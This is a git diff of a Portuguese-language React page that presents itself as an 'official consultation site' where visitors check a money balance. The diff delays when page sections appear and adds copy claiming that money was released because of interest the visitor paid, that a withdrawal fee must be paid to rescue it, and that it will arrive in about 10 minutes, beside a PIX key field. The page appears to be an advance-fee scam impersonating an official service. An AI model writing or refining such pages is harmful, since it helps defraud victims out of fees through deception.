@@ -4,6 +4,7 @@ import { ConsultStepBox } from "../components/consult-step-box";
 import { FaLock, FaSearch, FaUserAlt } from "react-icons/fa";
 import { Helmet } from "react-helmet"
 import logo from "../assets/logo.png"
+import logo2 from "../assets/logo3.png"
 import { api } from "../config/axios";
 
 interface IUser {
@@ -29,12 +30,12 @@ export function Tutorial() {
 
     useEffect(() => {
         /* ALTERE O VALOR 10 PARA OS SEGUNDOS EM QUE AS SEÇÕES VÃO APARECER */
-        const SECONDS_TO_DISPLAY = 30;
+        const SECONDS_TO_DISPLAY = 50;
 
         /* DAQUI PARA BAIXO NAO PRECISA ALTERAR */
         let attempts = 0;
         let elsDisplayed = false;
-        const alreadyDisplayedKey = `alreadyElsDisplayed${SECONDS_TO_DISPLAY}`
+        const alreadyDisplayedKey = `alreadyElsDisplayedNew${SECONDS_TO_DISPLAY}`
         const alreadyElsDisplayed = localStorage.getItem(alreadyDisplayedKey);
 
         const showHiddenElements = function () {
@@ -218,16 +219,18 @@ export function Tutorial() {
                             <script type="text/javascript" id="scr_653e714409054e00092a768a">var s=document.createElement("script");s.src="https://scripts.converteai.net/ae05c9da-e785-4dd5-894c-cd71694958ee/players/653e714409054e00092a768a/player.js",s.async=!0,document.head.appendChild(s);</script>
                         </Helmet>
                     </div>
-                    <div className="p-4">
-                        {user && (
+                    <div className="p-3">
+                        {isPlayerButtonVisible ? (
                             <button onClick={() => {
                                 setStep(3)
-                            }} className="flex justify-center w-full items-center space-x-2 text-xl bg-blue-700 text-white p-4 font-bold rounded-3xl">
+                            }} className="flex justify-center w-full items-center space-x-2 text-xl bg-green-600 text-white p-4 font-bold rounded-3xl">
                                 <span>VERIFICAR MEU SALDO AGORA</span>
                             </button>
+                        ) : (
+                            <div className="flex text-lg justify-center text-gray-600 font-semibold">Carregando seus dados... Aguarde.</div>
                         )}
                         <div className="justify-center flex flex-col my-8 items-center text-gray-800">
-                            <img width={100} src={logo} alt="logo" />
+                            <img width={100} src={logo2} alt="logo" />
                             <div>Site de consultas oficial.</div>
                         </div>
                     </div>
@@ -270,6 +273,18 @@ export function Tutorial() {
                             </div>
                         </div>
 
+                        <div className="text-xl text-gray-700 font-bold mt-10 mb-10">
+                            Esse dinheiro foi liberado por conta dos juros que você pagou nos últimos anos.
+                        </div>
+
+                        <div className="text-xl text-gray-700 font-semibolds mt-10 mb-10">
+                            Pague a taxa do saque para resgatar seu dinheiro.
+                        </div>
+
+                        <div className="text-xl text-gray-700 font-semibolds mt-6 mb-10">
+                            O dinheiro cairá na sua conta em cerca de <span className="font-bold text-blue-800">10 minutos.</span>
+                        </div>
+
                         <div className="text-gray-700 my-6 flex flex-col space-y-4">
                             <span className="font-bold text-xl">Insira seu PIX</span>
                             <input
@@ -290,7 +305,7 @@ export function Tutorial() {
                             </button>
                         </a>
                         <div className="justify-center flex flex-col my-8 items-center text-gray-800">
-                            <img width={100} src={logo} alt="logo" />
+                            <img width={100} src={logo2} alt="logo" />
                             <div>Site de consultas oficial.</div>
                         </div>
                     </div>
